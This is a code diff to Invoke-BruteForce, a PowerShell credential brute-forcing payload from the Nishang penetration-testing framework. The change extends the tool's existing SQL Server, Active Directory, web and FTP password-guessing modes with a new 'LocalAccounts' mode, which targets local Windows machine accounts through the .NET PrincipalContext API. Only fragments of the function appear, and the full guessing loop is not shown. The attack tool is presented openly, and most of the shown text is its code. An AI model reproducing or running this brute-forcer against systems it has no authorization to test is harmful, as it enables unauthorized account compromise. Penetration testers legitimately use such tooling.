@@ -3,13 +3,13 @@ function Invoke-BruteForce
 {
   <#
 .SYNOPSIS
-Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Web and FTP.
+Nishang payload which performs a Brute-Force Attack against SQL Server, Active Directory, Local Accounts, Web and FTP.
 
 .DESCRIPTION
-This payload can brute force credentials for SQL Server, ActiveDirectory, Web or FTP.
+This payload can brute force credentials for SQL Server, ActiveDirectory, LocalAccounts, Web or FTP.
 
 .PARAMETER Computername
-Specifies a SQL Server, Domain, FTP Site or Web Site.
+Specifies a SQL Server, Domain, Computer, FTP Site or Web Site.
 
 .PARAMETER UserList
 Specify a list of users. If blank, trusted connection will be used for SQL and an error will be genrated for other services.
@@ -18,7 +18,7 @@ Specify a list of users. If blank, trusted connection will be used for SQL and a
 Specify a list of passwords.
 
 .PARAMETER Service
-Enter a Service from SQL, ActiveDirecotry, FTP and Web. Default service is set to SQL.
+Enter a Service from SQL, ActiveDirecotry, LocalAccounts, FTP and Web. Default service is set to SQL.
 
 .PARAMETER StopOnSuccess
 Use this switch to stop the brute forcing on the first success.
@@ -66,7 +66,7 @@ Goude 2012, TreuSec
         [String]
         $PasswordList,
 
-        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","Web")]
+        [Parameter(Position = 3, Mandatory = $true)] [ValidateSet("SQL","FTP","ActiveDirectory","LocalAccounts","Web")]
         [String]
         $Service = "SQL",
 
@@ -214,11 +214,19 @@ Goude 2012, TreuSec
         }
 
         #Brute Force Active Directory
-        elseif ($service -eq "ActiveDirectory")
+        elseif ($service -eq "ActiveDirectory" -or $service -eq "LocalAccounts")
         {
-            Write-Output "Brute Forcing Active Directory $ComputerName"
+	    if ($service -eq "ActiveDirectory")
+	    {
+	        Write-Output "Brute Forcing Active Directory $ComputerName"
+                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+	    }
+	    else
+	    {
+	        Write-Output "Brute Forcing Local Accounts $ComputerName"
+                $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Machine
+	    }
             Add-Type -AssemblyName System.DirectoryServices.AccountManagement
-            $contextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
             Try
             {
                 $principalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($contextType, $ComputerName)
